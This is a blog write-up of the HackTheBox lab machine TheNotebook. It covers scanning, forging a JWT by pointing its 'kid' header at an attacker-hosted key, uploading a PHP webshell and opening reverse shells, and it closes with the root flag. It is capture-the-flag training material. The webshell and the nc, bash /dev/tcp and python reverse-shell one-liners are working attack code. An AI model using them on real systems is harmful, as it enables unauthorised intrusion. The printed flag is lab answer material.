---
layout: post
title: "HackTheBox: TheNotebook"
description: Write up and complete walkthrough of HackTheBox's TheNotebook
---

Medium (5/10 Avg)

# Initial Scan:

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 23:58 EDT
Nmap scan report for 10.10.10.230
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)kali
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/17%OT=22%CT=1%CU=30603%PV=Y%DS=2%DC=I%G=Y%TM=60F3A6E
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Useful notes:

- Running Linux

Open Ports:

- 22: SSH
- 80: http with nginx v1.14.0
- 10010: rxapi

# Port 80

# FuFF Scan:

```bash
$ ffuf -u http://10.10.10.230/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt | tee ffuf_1.out

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.230/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

register                [Status: 200, Size: 1422, Words: 193, Lines: 33]
admin                   [Status: 403, Size: 9, Words: 1, Lines: 1]
login                   [Status: 200, Size: 1250, Words: 173, Lines: 31]
logout                  [Status: 302, Size: 209, Words: 22, Lines: 4]
:: Progress: [43003/43003] :: Job [1/1] :: 214 req/sec :: Duration: [0:02:06] :: Errors: 0 ::
```

# Webpage

- Presence of a login page & a register page
  ![Untitled](/assets/20210718001500.png)

- Does not seem to be an sqli injection after an initial sqlmap scan and some manual attack vectors testing

```bash
[01:05:58] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[01:05:58] [WARNING] HTTP error codes detected during run:
400 (Bad Request) - 257 times
```

- Does not appear to be a XSS flaw to exploit at first. Might need to check more.
  ![Untitled](/assets/20210718003530.png)

- The url also could have something meaningful:
  `http://10.10.10.230/7457c1fa-d329-48fe-b077-8d53e9240a4d/notes`

# Nginx vulnerabilities

Through Nmap we saw that we are running nginx version `1.14.0`

The [nginx changelist](http://nginx.org/en/CHANGES-1.14) shows that this version came out in 2018, which could mean that there has been some that were patched.

We can also see that in version `1.14.1`, there was a fix to 2 security flaws:

1. Security: when using HTTP/2 a client might cause excessive memory consumption (CVE-2018-16843) and CPU usage (CVE-2018-16844).

2. Security: processing of a specially crafted mp4 file with the ngx_http_mp4_module might result in worker process memory disclosure (CVE-2018-16845).

- When searching through searchsploit:

```bash
$ searchsploit nginx
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nginx (Debian Based Distros + Gentoo) - 'logrotate' Local Privilege Escalation                                                        | linux/local/40768.sh
Nginx 0.6.36 - Directory Traversal                                                                                                    | multiple/remote/12804.txt
Nginx 0.6.38 - Heap Corruption                                                                                                        | linux/local/14830.py
Nginx 0.6.x - Arbitrary Code Execution NullByte Injection                                                                             | multiple/webapps/24967.txt
Nginx 0.7.0 < 0.7.61 / 0.6.0 < 0.6.38 / 0.5.0 < 0.5.37 / 0.4.0 < 0.4.14 - Denial of Service (PoC)                                     | linux/dos/9901.txt
Nginx 0.7.61 - WebDAV Directory Traversal                                                                                             | multiple/remote/9829.txt
Nginx 0.7.64 - Terminal Escape Sequence in Logs Command Injection                                                                     | multiple/remote/33490.txt
Nginx 0.7.65/0.8.39 (dev) - Source Disclosure / Download                                                                              | windows/remote/13822.txt
Nginx 0.8.36 - Source Disclosure / Denial of Service                                                                                  | windows/remote/13818.txt
Nginx 1.1.17 - URI Processing SecURIty Bypass                                                                                         | multiple/remote/38846.txt
Nginx 1.3.9 < 1.4.0 - Chuncked Encoding Stack Buffer Overflow (Metasploit)                                                            | linux/remote/25775.rb
Nginx 1.3.9 < 1.4.0 - Denial of Service (PoC)                                                                                         | linux/dos/25499.py
Nginx 1.3.9/1.4.0 (x86) - Brute Force                                                                                                 | linux_x86/remote/26737.pl
Nginx 1.4.0 (Generic Linux x64) - Remote Overflow                                                                                     | linux_x86-64/remote/32277.txt
PHP-FPM + Nginx - Remote Code Execution                                                                                               | php/webapps/47553.md

```

Nothing seems interesting in this list. Another deadend.

# JWT Exploitation

![Untitled](/assets/20210718033649.png)

# Foothold:

The vulnerability in the web application does not lie within the application itself, but rather the authentication. The app is using JWT to manage users and roles.

- The "kid" parameter is used in the header of the token, and is pointing to a webserver hosting the private key. If we change this url, we can force the validation of the JWT by providing our own private key.
- Generate a RSA private key: `ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key`
- Setup a webserver to host the private key: `python3 -m http.server`
- Forge the token using the private key and the information required. Set the `admin_cap` parameter of the payload to true:

```json
{
  "username": "xd",
  "email": "xd@xd.com",
  "admin_cap": true
}
```

Forged JWT:

```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yOjgwMDAvand0UlMyNTYua2V5In0.eyJ1c2VybmFtZSI6InhkIiwiZW1haWwiOiJ4ZEB4ZC5jb20iLCJhZG1pbl9jYXAiOnRydWV9.CFkbzqfbYi3AKeZnBWvHJ1Zt_pIxD08HXEOcIgDA-6fifRq6GHE9k3SZckVeeqKh1DF6FwApNBovAPbE4_axEWNqROAC8bSMPPGyfj7rCOUggLl5jqHp7EBzQ-TfMlJ4pzIYVpk-L10U2lhvJFSKUZwnvtJqYIBirOLAOaDky7ETDYxagjaNWen196jHmXEvnf_SMcWLqEHssoBPPp7Dt_J8cOO0prqZ69W5_s6qrhcNPmSwAScM_GtKa35eAC2y2bOCPrOJvLqF3WWyIshZViytyJovtvW2uMms6I9J9KCnI2noXB6q9KsNb9bsBaQkyRINiiAFQcil6XnLdTWXXO6KvIrcmSnJ6a5fDHiBXncrDkN0yED981LLXtLO3XKBfDjjZZhgMzybWQIeGMKpd2soI_TH9IKvzhz3x6svDdYkvClzt0n8aCVJPpTZBxBwGXiILLhsZnmvr8xUs7GxjeauXqhV6HILUy9bYRuoQn29IyYSZooYUu00qtVhUfgrNlHTNonUy9zxks-WRWeJp6CzZzsh1pMXkQUz1OGIICuz1KX61n4eKSsK83lBM29QBXXk7zwk5HL5BiyxsWZaQhHmaHDu_mu9k5Oa-VBzLDyGqKWAKadPAo3e1CwnMjk4VR8n054aQ9UftTsgVqpkHmei5ajA9SVc08gMQfYwmI0
```

Change the cookies before making the request to the webpage to include the newly forged webtoken:

```http
Cookies:
auth=<newly_forged_token>;
uuid=<your_uuid>
```

# RCE

Once we get access to the admin panel, we also get access to the admin notes.
A particular note here states:

![Untitled](/assets/20210718155856.png)

- In the admin panel, we also have access to a file upload.
- We can try to upload a webshell such as this one to possible get RCE, From this [gist](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985):

  ```php
  <html>
  <body>
  <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
  <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
  <input type="SUBMIT" value="Execute">
  </form>
  <pre>
  <?php
  	if(isset($_GET['cmd']))
  	{
  		system($_GET['cmd']);
  	}
  ?>
  </pre>
  </body>
  </html>

  ```

  Surely enough the file goes through and we get RCE:
  ![Untitled](/assets/20210718160348.png)

- We can then proceed to get a reverse shell with a command like this (but there are plenty of commands out there):

  ```bash
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <RHOST> <RPORT> >/tmp/f
  ```

  - Other possible ones:
    ```bash
    bash -i >& /dev/tcp/<RHOST>/<RPORT> 0>&1
    ```
    or
    ```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<RHOST>",<RPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```

![Untitled](/assets/20210721211051.png)

Root flag:
2414e89cc5b4ae800f860afebcceaf9f

![Untitled](/assets/20210721211445.png)
